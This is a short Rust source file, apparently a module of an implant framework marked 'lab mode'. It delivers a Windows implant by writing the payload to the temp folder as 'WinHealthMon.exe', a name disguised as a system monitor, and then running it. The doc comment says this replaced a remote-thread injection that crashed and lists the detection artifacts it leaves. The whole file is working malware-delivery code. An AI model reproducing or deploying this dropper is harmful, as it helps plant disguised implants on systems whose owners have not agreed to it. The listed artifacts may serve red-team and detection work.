//! Windows Implant Delivery — Drop-to-disk (lab mode)
//!
//! Drops the implant to a temp file and spawns it as a new process.
//! Replaces CreateRemoteThread injection which crashed because the
//! oxide implant is a PE binary, not shellcode.
//!
//! Detection artifacts:
//! - File write to %TEMP%\WinHealthMon.exe
//! - Process creation from %TEMP%

#![cfg(windows)]

use super::InjectionError;

/// Drop implant to temp and spawn as process.
pub fn inject(payload: &[u8]) -> Result<(), InjectionError> {
    let temp_path = std::env::temp_dir().join("WinHealthMon.exe");
    std::fs::write(&temp_path, payload)
        .map_err(|e| InjectionError::WriteFailed(e.to_string()))?;
    std::process::Command::new(&temp_path)
        .spawn()
        .map_err(|e| InjectionError::ThreadFailed(e.to_string()))?;
    Ok(())
}
